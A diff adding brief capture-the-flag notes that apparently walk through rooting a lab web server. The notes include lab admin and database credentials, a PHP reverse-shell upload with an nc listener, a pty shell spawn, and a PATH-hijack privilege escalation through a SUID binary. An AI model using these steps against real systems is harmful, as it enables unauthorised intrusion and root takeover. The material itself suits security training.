@@ -1,0 +1,56 @@
+First Web
+
+Check nmap
+
+Check apache2
+
+Check files in burp
+
+found /cdn-cgi/login
+
+Try last login:
+admin
+MEGACORP_4dm1n!!
+
+Bruteforce id to get the cookie for super user:
+    <tr>
+      <td>86575</td>
+      <td>super admin</td>
+      <td>superadmin@megacorp.com</td>
+    </tr>
+
+Upload and reversetcp:
+
+$ cp /usr/share/webshells/php/php-reverse-shell.php official.php
+change variables
+$ nc -lvnp port
+$ python3 dirsearch.py -u http://10.10.10.28 -e php
+
+
+---------------Getting root
+$ ls /var/www/html/cdn-cgi/login
+$ cat /var/www/html/cdn-cgi/login/db.php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+
+The id command reveals that robert is a member of the bugracker group. We can enumerate the filesystem to see if this group has any special access:
+
+$ find / -group bugtracker
+/usr/bin/bugtracker
+$ ls -al /usr/bin/bugtracker
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25 10:14 /usr/bin/bugtracker -> the 's' meains that we has special acces
+
+Spawn a shell:
+$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+$ su robert
+
+$ strings /usr/bin/bugtracker
+cat /root/reports/ 
+
+Because its use relative paths we can abuse this:
+export PATH=.:$PATH
+echo '/bin/sh' > cat
+chmod +x ./cat
+
+And finally we got the root
